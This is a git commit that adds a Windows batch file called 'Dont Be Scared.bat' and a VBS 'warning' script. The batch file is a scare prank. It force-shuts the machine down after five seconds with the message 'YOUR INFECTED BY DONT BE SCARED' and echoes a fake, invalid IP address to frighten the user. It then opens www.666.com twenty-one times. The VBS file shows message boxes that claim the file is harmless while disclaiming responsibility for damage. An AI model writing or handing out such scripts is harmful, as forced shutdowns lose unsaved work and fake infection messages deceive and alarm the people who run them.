1da82c348e17931146b106404a780c28199783d4
brycethegoat <114588602+brycethegoat@users.noreply.github.com>
2022-09-28 09:10:14 -0500

    Add files via upload

---
+++ Dont Be Scared.bat
@@ -0,0 +1,31 @@
+@echo off
+echo Message here.
+shutdown -s -f -t 5 -c "YOUR INFECTED BY DONT BE SCARED"
+Echo Dont Be Scared
+Echo Im Here
+Echo IP 124.983.453.563
+Echo IP 124.983.453.563
+Echo IP 124.983.453.563
+Echo IP 124.983.453.563
+Echo IP 124.983.453.563
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
+Start www.666.com
---
+++ READ BEFORE STARTING THE DONT BE SCARED.vbs
@@ -0,0 +1,3 @@
+Message = MsgBox("This Will Not Harm ur Conputer if ur Conputer Gets Messed up the Owner is not responsible for the Damages caused by this file please take caution", 4+48, "WARNING")
+Message = MsgBox("You Can Now Start The Dont Be Scared", 4+48, "WARNING")
+
